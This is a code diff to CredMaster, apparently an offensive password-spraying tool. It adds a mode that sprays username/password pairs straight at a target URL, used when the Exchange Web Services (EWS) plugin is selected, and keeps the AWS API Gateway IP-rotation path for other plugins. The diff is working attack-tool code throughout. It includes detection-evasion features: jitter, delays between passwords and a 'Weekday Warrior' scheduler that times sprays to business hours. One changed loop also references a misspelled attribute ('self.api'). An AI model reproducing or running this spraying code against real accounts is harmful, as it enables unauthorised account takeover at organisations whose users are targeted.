@@ -232,99 +232,194 @@ class CredMaster(object):
 
 		# this is the original URL, NOT the fireproxy one. Don't use this in your sprays!
 		url = pluginargs["url"]
+		plugin = args.plugin
 
 		threads = []
 
+		use_fireprox = True
 		try:
-			# Create lambdas based on thread count
-			self.load_apis(url)
 
-			# do test connection / fingerprint
-			useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
-			connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, args, self.apis[0], useragent)
-			self.log_entry(testconnect_output)
+			# If plugin = EWS don't use fireprox for now
+			if plugin == 'ews':
+				use_fireprox = False
+				self.log_entry("[!] EWS plugin selected, not using fireprox for now...")
+				# print(use_fireprox)
+				# sys.exit()
 
-			if not connect_success:
-				self.destroy_apis()
-				sys.exit()
+				# do test connection / fingerprint
+				useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+				# connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, args, url, useragent)
+				# self.log_entry(testconnect_output)
 
-			# Print stats
-			self.display_stats()
+				# if not connect_success:
+				#	sys.exit()
 
-			self.log_entry("Starting Spray...")
+				# Print stats
+				self.display_stats(True, use_fireprox)
 
-			count = 0
-			time_count = 0
-			passwords = ["Password123"]
-			if self.userpassfile is None and not self.userenum:
-				passwords = self.load_file(self.passwordfile)
+				self.log_entry("Starting Spray...")
 
-			for password in passwords:
+				count = 0
+				time_count = 0
+				passwords = ["Password123"]
+				if self.userpassfile is None and not self.userenum:
+					passwords = self.load_file(self.passwordfile)
 
-				time_count += 1
-				if time_count == 1:
-					if self.userenum:
-						notify.notify_update("Info: Starting Userenum.", self.notify_obj)
+				for password in passwords:
+
+					time_count += 1
+					if time_count == 1:
+						if self.userenum:
+							notify.notify_update("Info: Starting Userenum.", self.notify_obj)
+						else:
+							notify.notify_update(f"Info: Starting Spray.\nPass: {password}", self.notify_obj)
+
 					else:
-						notify.notify_update(f"Info: Starting Spray.\nPass: {password}", self.notify_obj)
+						notify.notify_update(f"Info: Spray Continuing.\nPass: {password}", self.notify_obj)
 
-				else:
-					notify.notify_update(f"Info: Spray Continuing.\nPass: {password}", self.notify_obj)
+					if self.weekdaywarrior is not None:
+						spray_days = {
+							0 : "Monday",
+							1 : "Tuesday",
+							2 : "Wednesday",
+							3 : "Thursday",
+							4 : "Friday",
+							5 : "Saturday",
+							6 : "Sunday" ,
+						}
 
-				if self.weekdaywarrior is not None:
-					spray_days = {
-						0 : "Monday",
-						1 : "Tuesday",
-						2 : "Wednesday",
-						3 : "Thursday",
-						4 : "Friday",
-					    5 : "Saturday",
-					    6 : "Sunday" ,
-					}
+						self.weekdaywarrior = int(self.weekdaywarrior)
+						sleep_time = self.ww_calc_next_spray_delay(self.weekdaywarrior)
+						next_time = datetime.datetime.utcnow() + datetime.timedelta(hours=self.weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
+						self.log_entry(f"Weekday Warrior: sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}")
+						time.sleep(sleep_time*60)
 
-					self.weekdaywarrior = int(self.weekdaywarrior)
-					sleep_time = self.ww_calc_next_spray_delay(self.weekdaywarrior)
-					next_time = datetime.datetime.utcnow() + datetime.timedelta(hours=self.weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
-					self.log_entry(f"Weekday Warrior: sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}")
-					time.sleep(sleep_time*60)
+					self.load_credentials(password)
 
-				self.load_credentials(password)
+					# Start Spray
+					threads = []
 
-				# Start Spray
-				threads = []
-				for api in self.apis:
-					t = threading.Thread(target = self.spray_thread, args = (api["region"], api, pluginargs) )
+					t = threading.Thread(target = self.spray_thread_no_fireprox, args = (url, pluginargs) )
 					threads.append(t)
 					t.start()
 
-				for t in threads:
-					t.join()
+					for t in threads:
+						t.join()
 
-				count = count + 1
+					count = count + 1
 
-				if self.delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
-					if self.userpassfile != None:
-						self.log_entry(f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.utcnow()}")
-					elif self.userenum:
-						self.log_entry(f"Completed userenum at {datetime.datetime.utcnow()}")
+					if self.delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
+						if self.userpassfile != None:
+							self.log_entry(f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.utcnow()}")
+						elif self.userenum:
+							self.log_entry(f"Completed userenum at {datetime.datetime.utcnow()}")
+						else:
+							self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}")
+
+						notify.notify_update(f"Info: Spray complete.", self.notify_obj)
+						continue
+					elif count != self.passwordsperdelay:
+						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, moving on to next password...")
+						continue
 					else:
-						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}")
+						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, sleeping for {self.delay} minutes before next password spray")
+						self.log_entry(f"Valid credentials discovered: {len(self.results)}")
+						for success in self.results:
+							self.log_entry(f"Valid: {success['username']}:{success['password']}")
+						count = 0
+						time.sleep(self.delay * 60)
 
-					notify.notify_update(f"Info: Spray complete.", self.notify_obj)
-					continue
-				elif count != self.passwordsperdelay:
-					self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, moving on to next password...")
-					continue
-				else:
-					self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, sleeping for {self.delay} minutes before next password spray")
-					self.log_entry(f"Valid credentials discovered: {len(self.results)}")
-					for success in self.results:
-						self.log_entry(f"Valid: {success['username']}:{success['password']}")
-					count = 0
-					time.sleep(self.delay * 60)
+			else:
+				# Create lambdas based on thread count
+				self.load_apis(url)
 
-			# Remove AWS resources
-			self.destroy_apis()
+				# do test connection / fingerprint
+				useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"
+				connect_success, testconnect_output, pluginargs = validator.testconnect(pluginargs, args, self.apis[0], useragent)
+				self.log_entry(testconnect_output)
+
+				if not connect_success:
+					self.destroy_apis()
+					sys.exit()
+
+				# Print stats
+				self.display_stats()
+
+				self.log_entry("Starting Spray...")
+
+				count = 0
+				time_count = 0
+				passwords = ["Password123"]
+				if self.userpassfile is None and not self.userenum:
+					passwords = self.load_file(self.passwordfile)
+
+				for password in passwords:
+
+					time_count += 1
+					if time_count == 1:
+						if self.userenum:
+							notify.notify_update("Info: Starting Userenum.", self.notify_obj)
+						else:
+							notify.notify_update(f"Info: Starting Spray.\nPass: {password}", self.notify_obj)
+
+					else:
+						notify.notify_update(f"Info: Spray Continuing.\nPass: {password}", self.notify_obj)
+
+					if self.weekdaywarrior is not None:
+						spray_days = {
+							0 : "Monday",
+							1 : "Tuesday",
+							2 : "Wednesday",
+							3 : "Thursday",
+							4 : "Friday",
+							5 : "Saturday",
+							6 : "Sunday" ,
+						}
+
+						self.weekdaywarrior = int(self.weekdaywarrior)
+						sleep_time = self.ww_calc_next_spray_delay(self.weekdaywarrior)
+						next_time = datetime.datetime.utcnow() + datetime.timedelta(hours=self.weekdaywarrior) + datetime.timedelta(minutes=sleep_time)
+						self.log_entry(f"Weekday Warrior: sleeping {sleep_time} minutes until {next_time.strftime('%H:%M')} on {spray_days[next_time.weekday()]} in UTC {self.weekdaywarrior}")
+						time.sleep(sleep_time*60)
+
+					self.load_credentials(password)
+
+					# Start Spray
+					threads = []
+
+					for api in self.api:
+						t = threading.Thread(target = self.spray_thread, args = (api["region"], api, pluginargs) )
+						threads.append(t)
+						t.start()
+
+					for t in threads:
+						t.join()
+
+					count = count + 1
+
+					if self.delay is None or len(passwords) == 1 or password == passwords[len(passwords)-1]:
+						if self.userpassfile != None:
+							self.log_entry(f"Completed spray with user-pass file {self.userpassfile} at {datetime.datetime.utcnow()}")
+						elif self.userenum:
+							self.log_entry(f"Completed userenum at {datetime.datetime.utcnow()}")
+						else:
+							self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}")
+
+						notify.notify_update(f"Info: Spray complete.", self.notify_obj)
+						continue
+					elif count != self.passwordsperdelay:
+						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, moving on to next password...")
+						continue
+					else:
+						self.log_entry(f"Completed spray with password {password} at {datetime.datetime.utcnow()}, sleeping for {self.delay} minutes before next password spray")
+						self.log_entry(f"Valid credentials discovered: {len(self.results)}")
+						for success in self.results:
+							self.log_entry(f"Valid: {success['username']}:{success['password']}")
+						count = 0
+						time.sleep(self.delay * 60)
+
+				# Remove AWS resources
+				self.destroy_apis()
 
 		except KeyboardInterrupt:
 			self.log_entry("KeyboardInterrupt detected, cleaning up APIs")
@@ -342,7 +437,10 @@ class CredMaster(object):
 		self.time_lapse = (self.end_time-self.start_time).total_seconds()
 
 		# Print stats
-		self.display_stats(False)
+		if use_fireprox:
+			self.display_stats(False, True)
+		else:
+			self.display_stats(False, False)
 
 
 	def load_apis(self, url, region=None):
@@ -389,10 +487,12 @@ class CredMaster(object):
 		return args, help_str
 
 
-	def display_stats(self, start=True):
+	def display_stats(self, start=True, use_fireprox=True):
+
 		if start:
-			self.log_entry(f"Total Regions Available: {len(self.regions)}")
-			self.log_entry(f"Total API Gateways: {len(self.apis)}")
+			if use_fireprox:
+				self.log_entry(f"Total Regions Available: {len(self.regions)}")
+				self.log_entry(f"Total API Gateways: {len(self.apis)}")
 
 		if self.end_time and not start:
 			self.log_entry(f"End Time: {self.end_time}")
@@ -401,7 +501,7 @@ class CredMaster(object):
 
 			for cred in self.results:
 				self.log_entry(f"VALID - {cred['username']}:{cred['password']}")
-
+		
 
 	def list_apis(self):
 
@@ -467,6 +567,60 @@ class CredMaster(object):
 					clear_count += 1
 
 		self.log_entry(f"APIs removed: {clear_count}")
+
+
+	def spray_thread_no_fireprox(self, url, pluginargs):
+
+			try:
+				plugin_authentiate = getattr(importlib.import_module(f"plugins.{self.plugin}.{self.plugin}"), f"{self.plugin}_authenticate")
+			except Exception as ex:
+				self.log_entry("Error: Failed to import plugin with exception")
+				self.log_entry(f"Error: {ex}")
+				sys.exit()
+
+			while not self.q_spray.empty() and not self.cancelled:
+
+				try:
+					cred = self.q_spray.get_nowait()
+
+					if self.jitter is not None:
+						if self.jitter_min is None:
+							self.jitter_min = 0
+						time.sleep(random.randint(self.jitter_min,self.jitter))
+
+					response = plugin_authentiate(url, cred["username"], cred["password"], cred["useragent"], pluginargs)
+
+					# if "debug" in response.keys():
+					# 	print(response["debug"])
+
+					if response["error"]:
+						self.log_entry(f"ERROR: {cred['username']} - {response['output']}")
+
+					if response["result"].lower() == "success" and ("userenum" not in pluginargs):
+						self.results.append( {"username" : cred["username"], "password" : cred["password"]} )
+						notify.notify_success(cred["username"], cred["password"], self.notify_obj)
+						self.log_success(cred["username"], cred["password"])
+
+					if response["valid_user"] or response["result"] == "success":
+						self.log_valid(cred["username"], self.plugin)
+
+					if self.color:
+
+						if response["result"].lower() == "success":
+							self.log_entry(utils.prGreen(f"{response['output']}"))
+
+						elif response["result"].lower() == "potential":
+							self.log_entry(utils.prYellow(f"{response['output']}"))
+
+						elif response["result"].lower() == "failure":
+							self.log_entry(utils.prRed(f"{response['output']}"))
+
+					else:
+						self.log_entry(f"{response['output']}")
+
+					self.q_spray.task_done()
+				except Exception as ex:
+					self.log_entry(f"ERROR: {cred['username']} - {ex}")
 
 
 	def spray_thread(self, api_key, api_dict, pluginargs):
